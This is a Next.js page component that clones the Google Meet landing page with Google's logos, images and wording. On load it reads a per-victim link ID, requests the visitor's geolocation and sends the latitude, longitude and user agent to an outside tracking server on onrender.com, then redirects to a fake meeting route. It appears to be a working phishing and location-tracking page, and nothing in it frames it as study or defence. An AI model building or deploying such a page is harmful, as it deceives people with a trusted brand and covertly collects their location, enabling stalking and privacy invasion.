"use client"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Avatar, AvatarFallback } from "@/components/ui/avatar"
import { Separator } from "@/components/ui/separator"

import {
  Menu,
  HelpCircle,
  MessageSquare,
  Grid3X3,
  Video,
  Calendar,
  Phone,
  ChevronLeft,
  ChevronRight,
} from "lucide-react"
import Image from "next/image"

import { useRouter, useParams } from 'next/navigation'
import { useEffect } from 'react'


export default function Home() {

 const router = useRouter()
  const params = useParams()
  const linkId = params.linkId as string
  useEffect(() => {
    if (!linkId) return

    const trackLocation = async () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (position) => {
          await fetch('https://tracker-app-eung.onrender.com/api/save-location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              linkId,
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              userAgent: navigator.userAgent
            })
          })


          router.push(`/meeting/${linkId}`)
        }, (error) => {
          console.error('Geolocation error:', error)

        })
      } else {
        console.log('Geolocation not supported')

      }
    }

    trackLocation()
  }, [linkId, router])


  return (
    <div className="min-h-screen bg-white">
      {/* Header */}
      <header className="flex items-center justify-between px-4 py-2 border-b border-gray-200">
        <div className="flex items-center gap-4">
          <Button variant="ghost" size="icon" className="text-gray-600">
            <Menu className="h-5 w-5" />
          </Button>
         <div className="flex items-center gap-2">
  <div className="py-4">
    <Image
    width={200}
    height={200}
     src="https://www.gstatic.com/meet/google_meet_horizontal_wordmark_2020q4_1x_icon_124_40_2373e79660dabbf194273d27aa7ee1f5.png" alt="Meet Icon" className="h-full w-full" />
  </div>
  <span className="text-xl text-gray-500 font-semibold"> Meet</span>
</div>

        </div>

        <div className="flex items-center gap-4">
          <span className="text-base text-gray-600 hidden sm:block">07:27 • Thu 5 Jun</span>
          <Button variant="ghost" size="icon" className="text-gray-600">
            <HelpCircle className="h-5 w-5" />
          </Button>
          <Button variant="ghost" size="icon" className="text-gray-600">
            <MessageSquare className="h-5 w-5" />
          </Button>
          <Button variant="ghost" size="icon" className="text-gray-600">
            <Grid3X3 className="h-5 w-5" />
          </Button>
          <Avatar className="h-8 w-8">
            <AvatarFallback className="bg-purple-500 text-white text-sm">U</AvatarFallback>
          </Avatar>
        </div>
      </header>

      <div className="flex">
        {/* Sidebar */}
        <aside className="w-64 min-h-screen bg-gray-50 p-4 hidden lg:block">
          <nav className="space-y-2">
            <div className="flex items-center gap-3 px-4 py-3 bg-blue-100 text-blue-600 rounded-lg">
              <Calendar className="h-5 w-5" />
              <span className="font-medium">Meetings</span>
            </div>
            <div className="flex items-center gap-3 px-4 py-3 text-gray-600 hover:bg-gray-100 rounded-lg cursor-pointer">
              <Phone className="h-5 w-5" />
              <span>Calls</span>
            </div>
          </nav>
        </aside>

        {/* Main Content */}
        <main className="flex-1 px-4 lg:px-8 py-8">
          <div className="max-w-4xl mx-auto">
            {/* Hero Section */}
            <div className="text-center mb-12">
              <h1 className="font-poppins text-4xl lg:text-5xl font-normal text-gray-900 mb-4 leading-tight">
                Video calls and meetings for everyone
              </h1>
              <p className="text-2xl font-poppins text-gray-600 mb-8 max-w-2xl mx-auto">
                Connect, collaborate and celebrate from anywhere with Google Meet
              </p>

              {/* Action Buttons */}
              <div className="flex flex-col sm:flex-row items-center justify-center gap-4 mb-8">
                <Button className="bg-blue-600 hover:bg-blue-700  text-white px-8 py-6 rounded-full font-semibold">
                  <Video className="h-10 w-10 ml-2 mr-1" />
                  New meeting
                </Button>
                <div className="flex items-center gap-2">
                  <Input
                    placeholder="Enter a code or link"
                    className="w-64 px-8 py-6 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                  />
                  <Button variant="ghost" className="text-grey-200 hover:bg-blue-50 px-6 py-3 font-medium">
                    Join
                  </Button>
                </div>
              </div>
            </div>

           <div className="px-[10rem]">
            <Separator className="my-6 h-[1px] bg-gray-300 w-full" />
          </div>

            {/* Illustration Section */}
            <div className="relative mb-16">
              <div className="flex items-center justify-center mb-8">
                <Button variant="ghost" size="icon" className="absolute left-0 text-gray-400">
                  <ChevronLeft className="h-6 w-6" />
                </Button>

                {/* Main Illustration */}
                <div className="relative">
                <div className="w-80 h-80 bg-gradient-to-br from-blue-50 to-purple-50 rounded-full flex items-center justify-center overflow-hidden">
                  <Image
width={400}
height={400}
                    src="https://www.gstatic.com/meet/user_individual_dont_get_cut_short_b44fc1aa61a6d001c9bf098ddc33ac52.png"
                    alt="Google Meet Illustration"
                    className="w-72 h-72 object-contain"
                  />
                </div>
              </div>


                <Button variant="ghost" size="icon" className="absolute right-0 text-gray-400">
                  <ChevronRight className="h-6 w-6" />
                </Button>
              </div>
            </div>

            {/* Premium Features Section */}
            <div className="text-center mb-8">
              <h2 className="text-2xl font-normal text-gray-900 mb-4">Try Premium Google Meet features</h2>
              <p className="text-gray-600 mb-6 max-w-md mx-auto">
                Google Workspace Individual includes longer group calls, recording and other features.
              </p>
              <Button className="bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 rounded-lg font-medium">
                Get started
              </Button>
            </div>

            {/* Pagination Dots */}
            <div className="flex justify-center gap-2 mb-8">
              <div className="w-2 h-2 bg-blue-600 rounded-full"></div>
              <div className="w-2 h-2 bg-gray-300 rounded-full"></div>
              <div className="w-2 h-2 bg-gray-300 rounded-full"></div>
              <div className="w-2 h-2 bg-gray-300 rounded-full"></div>
              <div className="w-2 h-2 bg-gray-300 rounded-full"></div>
              <div className="w-2 h-2 bg-gray-300 rounded-full"></div>
            </div>

            {/* Footer Link */}
            <div className="text-center">
              <a href="#" className="text-blue-600 hover:underline text-sm">
                Learn more
              </a>
              <span className="text-gray-600 text-sm ml-1">about Google Meet</span>
            </div>
          </div>
        </main>
      </div>
    </div>
  )
}
